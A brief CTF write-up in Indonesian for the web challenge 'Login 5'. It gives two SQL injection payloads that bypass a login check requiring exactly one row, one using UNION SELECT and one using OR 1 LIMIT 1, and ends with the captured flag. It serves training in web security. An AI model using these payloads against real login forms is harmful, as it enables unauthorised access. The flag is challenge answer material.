# __ASGama CTF__ 
## _Login 5_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Web | 75 | l0l

**Description:** 

> http://ctf.asgama.web.id:40111/
>
> [source](./login5.php)

### Login 5
Mirip seperti [login4](../Login4/README.md), hanya saja kali ini jumlah row harus sama dengan 1. Dapat kita akali dengan perintah union atau limit.

### Payload
```
' and 0 union select 1,2,3 -- -
```

```
' or 1 limit 1 -- -
```

### Result
```
GamaCTF{EsKiEl_InJekS10n_W1th_Un10N}
```

### Flag
GamaCTF{EsKiEl_InJekS10n_W1th_Un10N}